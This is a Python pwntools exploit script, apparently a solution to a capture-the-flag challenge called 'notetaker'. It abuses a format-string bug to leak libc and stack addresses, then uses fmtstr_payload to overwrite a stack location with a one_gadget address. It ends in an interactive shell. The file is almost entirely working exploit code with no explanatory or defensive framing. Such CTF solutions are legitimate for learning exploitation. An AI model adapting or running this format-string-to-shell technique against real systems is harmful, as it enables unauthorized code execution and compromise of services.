#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./notetaker', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

# output = b''

# for i in range(100):
#     p.sendlineafter(b'> ', b'2')
#     p.sendlineafter(b'Enter the note: ', f"Addr {i}: %{i}$p".encode())
#     p.sendlineafter(b'> ', b'1')
#     p.recvuntil(f"Addr {i}: ".encode())
#     output += f"{i}: ".encode() + p.recvline().strip() + b"\n"

# print(output.decode())

def leak(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Enter the note: ', f"Addr: %{idx}$p".encode())
    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'Addr: ')
    leak = int(p.recvline().strip(), 16)
    return leak

libc.address = leak(1) - 0x3c4b28
log.info(f"libc base: {hex(libc.address)}")

stack = leak(40) - 0xd8
log.info(f"stack addr: {hex(stack)}")

og = [libc.address + 0x4527a, libc.address + 0xf03a4, libc.address + 0xf1247]

payload = fmtstr_payload(8, {stack: og[2]}, write_size='short')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Enter the note: ', payload)
p.sendlineafter(b'> ', b'1')

p.interactive()